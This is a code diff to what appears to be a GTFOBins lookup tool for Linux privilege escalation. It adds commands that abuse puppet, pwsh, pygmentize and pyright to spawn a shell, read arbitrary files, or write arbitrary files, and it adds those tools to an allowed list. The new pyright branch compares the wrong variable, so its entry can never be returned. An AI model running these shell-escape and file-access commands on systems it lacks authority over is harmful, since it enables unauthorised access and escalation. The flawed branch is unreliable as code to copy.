@@ -2928,6 +2928,36 @@ def gtfo_bins(gtfo_command, gtfo_options):
         else:
             bins.append("N/A")
 
+    elif gtfo_command == "puppet":
+        if gtfo_options == "shell":
+            bins.append("puppet apply -e ""exec { '/bin/sh <$(tty) >$(tty) 2>$(tty)': }""")
+        elif gtfo_options == "file-write":
+            bins.append("puppet apply -e 'file { ""/path/to/output-file"": content => ""DATA"" }'")
+        elif gtfo_options == "file-read":
+            bins.append("puppet filebucket -l diff /dev/null /path/to/input-file")
+        else:
+            bins.append("N/A")
+
+    elif gtfo_command == "pwsh":
+        if gtfo_options == "shell":
+            bins.append("pwsh")
+        elif gtfo_options == "file-write":
+            bins.append("pwsh -c '""DATA"" | Out-File /path/to/output-file'")
+        else:
+            bins.append("N/A")
+
+    elif gtfo_command == "pygmentize":
+        if gtfo_options == "file-read":
+            bins.append("pygmentize -l text /path/to/input-file")
+        else:
+            bins.append("N/A")
+
+    elif gtfo_command == "pyright":
+        if gtfo_command == "file-read":
+            bins.append("pyright /path/to/input-file")
+        else:
+            bins.append("N/A")
+
 #If there are any other misconfigurations run the other option
     elif gtfo_command == "other":
         if gtfo_options == "shell": #This will print out hints for more GTFO bins!
@@ -2975,7 +3005,8 @@ def main():
         "node", "nohup", "npm", "nroff", "nsenter", "octave","od", "opencode", "openssl", 
         "openvpn", "openvt","opkg","pandoc", "paste", "pax", "pdflatex","pdftex", "perf", 
         "perl", "perlbug", "psexec","pg", "php", "pic", "pidstat", "pip", "pkexec", 
-        "plymouth", "podman", "posh", "psftp", "pr","psql","ptx", "other",
+        "plymouth", "podman", "posh", "psftp", "pr","psql","ptx", "puppet", "pwsh", 
+        "pygmentize", "pyright", "other",
     }
 
     if start in ALLOWED:
